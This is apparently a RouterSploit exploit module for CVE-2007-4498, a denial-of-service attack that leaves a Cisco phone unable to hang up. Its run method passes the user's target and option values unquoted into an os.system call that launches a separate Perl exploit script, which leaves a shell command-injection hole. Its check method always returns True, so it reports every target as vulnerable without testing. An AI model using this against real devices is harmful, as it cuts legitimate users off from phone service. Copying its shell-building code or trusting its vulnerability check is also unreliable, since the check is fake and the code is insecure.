



import sys,os

from routersploit.core.exploit import *

from routersploit.core.http.http_client import HTTPClient

from ctypes import *



class Exploit(HTTPClient):



    __info__ = {

        "name": "CVE-2007-4498",

        "description": "Exploiting this issue allows remote attackers to cause the device to accept a phone while being unable to hang up. "
                       "This effectively denies service to legitimate users because further calls will not be accepted by the device.  ",

        "authors": (

            "###",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/30517",

        ),

        "devices": (

            "Cisco, CVE-2007-4498"
        ),
    }

    
    target = OptIP("", "destination address IPv4 or IPv6 address")
    dst_port = OptPort(80, "destination port")
    dst_username = OptString(""," destination username ")
    src_addr = OptIP(""," source address ")
    src_port = OptPort("","source port")
    src_username = OptString("","hostname")
    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'perl {} {} {} {} {} {} {}'.format('CVE-2007-4498.pl',self.target,self.dst_port,self.dst_username,self.src_addr,self.src_port,self.src_username)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True